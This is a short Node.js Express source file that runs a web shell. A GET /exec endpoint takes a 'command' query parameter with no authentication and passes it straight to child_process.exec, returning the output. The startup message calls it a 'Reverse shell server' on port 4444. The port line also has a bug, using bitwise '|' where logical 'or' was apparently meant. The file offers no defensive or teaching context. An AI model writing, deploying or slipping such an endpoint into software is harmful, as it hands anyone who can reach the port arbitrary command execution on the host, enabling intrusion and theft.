// app.js
const express = require('express');
const { exec } = require('child_process');
const app = express();
const port = 4444 | process.env.PORT;

app.get('/', (req, res) => {
  try {
    res.status(200).json({"port": port})
  } catch (error) {
    console.error(error);
    return res.status(500).send("Server error");
  }
});

app.get('/exec', (req, res) => {
  const command = req.query.command;
  if (!command) {
    return res.status(400).send('Missing command parameter.');
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      res.status(500).send(`Error: ${error.message}`);
      return;
    }
    if (stderr) {
      res.status(400).send(stderr);
      return;
    }
    res.send(stdout);
  });
});

app.listen(port, () => {
  console.log(`Reverse shell server listening on port ${port}`);
});
